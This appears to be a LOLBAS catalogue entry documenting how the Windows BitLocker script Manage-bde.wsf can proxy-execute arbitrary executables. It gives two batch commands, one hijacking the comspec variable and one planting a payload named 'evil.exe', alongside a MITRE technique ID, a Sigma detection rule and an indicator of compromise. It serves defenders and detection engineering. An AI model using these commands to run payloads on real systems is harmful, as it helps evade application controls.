---
Acknowledgement:
- Handle: '@bohops'
  Person: Jimmy
- Handle: '@danielbohannon'
  Person: Daniel Bohannon
- Person: John Lamb
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf
  Description: Set the comspec variable to another executable prior to calling manage-bde.wsf
    for execution.
  MitreID: T1216
  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Proxy execution from script
- Category: Execute
  Command: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\
    & cscript.exe c:\windows\system32\manage-bde.wsf
  Description: Run the manage-bde.wsf script with a payload named manage-bde.exe in
    the same directory to run the payload file.
  MitreID: T1216
  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Proxy execution from script
Created: 2018-05-25
Description: Script for managing BitLocker
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_manage_bde.yml
- IOC: Manage-bde.wsf should not be invoked by a standard user under normal situations
Full_Path:
- Path: C:\Windows\System32\manage-bde.wsf
Name: Manage-bde.wsf
Resources:
- Link: https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
- Link: https://twitter.com/bohops/status/980659399495741441
- Link: https://twitter.com/JohnLaTwC/status/1223292479270600706
mitre_data:
  technique_ids:
  - T1216
tags:
- lolbas/osscripts
---

# Manage-bde.wsf

Script for managing BitLocker

# Path(s)

- `C:\Windows\System32\manage-bde.wsf`

# Execute Commands

Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.

```batch
set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf
```

- **Usecase:** Proxy execution from script
- **Privileges Required:** User
- **MitreID:** `T1216`
- **Operating System(s):** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.

```batch
copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
```

- **Usecase:** Proxy execution from script
- **Privileges Required:** User
- **MitreID:** `T1216`
- **Operating System(s):** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
- https://twitter.com/bohops/status/980659399495741441
- https://twitter.com/JohnLaTwC/status/1223292479270600706
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Jimmy (@bohops)
- Daniel Bohannon (@danielbohannon)
- John Lamb